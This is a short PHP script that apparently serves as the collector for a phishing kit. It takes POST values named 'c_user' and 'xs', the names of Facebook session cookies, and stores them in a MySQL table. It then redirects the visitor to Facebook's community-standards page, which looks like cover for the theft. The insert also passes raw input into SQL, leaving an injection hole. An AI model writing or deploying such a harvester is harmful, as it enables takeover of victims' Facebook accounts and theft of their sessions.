<?php


// Establish a database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "abc";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $c_user = $_POST["c_user"];
    $xs = $_POST["xs"];

    // Insert data into the database
    $sql = "INSERT INTO Niaz (var_1, var_2, date_time) VALUES ('$c_user', '$xs', NOW());";

    if ($conn->query($sql) === TRUE) {

        header("Location: https://transparency.fb.com/en-gb/policies/community-standards/");
        exit(); 
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}

$conn->close();
?>
